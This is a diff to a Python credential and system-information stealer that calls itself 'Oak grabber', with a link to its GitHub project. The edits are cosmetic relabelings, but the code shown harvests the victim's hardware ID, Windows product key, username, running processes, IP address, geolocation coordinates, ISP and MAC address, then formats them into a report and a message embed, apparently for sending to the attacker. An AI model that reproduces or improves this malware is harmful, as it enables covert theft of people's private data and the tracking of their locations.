@@ -158,9 +158,8 @@ def main():
     except:disk = "N/A"
     try:about = f"DISK: {disk}GB"
     except:about = "N/A"
-    try:now = datetime.now()
-    except:now = "N/A"
-    try:ti= (now.strftime('date: '+'%Y/%m/%d'+'\ntime: ''%I:%M:%S'))
+    now = datetime.now()
+    try:ti= (now.strftime('Date: '+'%Y/%m/%d'+'\nTime: ''%I:%M:%S'))
     except:ti = "N/A"
     try:ram3 = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576)
     except:ram3 = "N/A"
@@ -260,17 +259,17 @@ def main():
     def sysinfo():
         tree = fr'''System Info  | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber
 
-hwid: {hardwareid}
-{ee} bit
-ram: {ramg} GB ram
-username: {pc_username}
+HWID: {hardwareid}
+RAM: {ramg} GB
+Architecture: {ee} bit 
+Username: {pc_username}
 {about}
 Platform: {platform}
 PC-Name: {Oakname}
 Windows key: {windowskey}
 {ti}
-Cpu: {cpu}
-Gpu: {gpu}
+CPU: {cpu}
+GPU: {gpu}
 Refresh rate: {rr}
 Model name: {mn}
 Build manufacturer: {bm}
@@ -278,14 +277,14 @@ Resolution: {size}
 Path: {idk}
 
 IP INFO
-ip: {ip}
-city: {city}
-country: {country}
-region: {region}
-googlemap: {googlemap}
-org: {org}
-mac: {mac}
-loc: {loc}
+IP: {ip}
+City: {city}
+Country: {country}
+Region: {region}
+GoogleMaps: {googlemap}
+Service provider: {org}
+MAC: {mac}
+Coordinates: {loc}
 
 Processes running
 {ps}'''
@@ -374,10 +373,10 @@ Processes running
                          },
                          "description": f"""{embedMsg}
                          **__PC INFO__**
-                         **Ram:** `{ramg}`
+                         **RAM:** `{ramg}`
                          **Disk:** `{disk}GB`
-                         **Cpu:** `{cpu}`
-                         **Gpu:** `{gpu}`
+                         **CPU:** `{cpu}`
+                         **GPU:** `{gpu}`
                          **Refresh rate:** `{rr}`
                          **Model name:** `{mn}`
                          **Build manufacturer:** `{bm}`
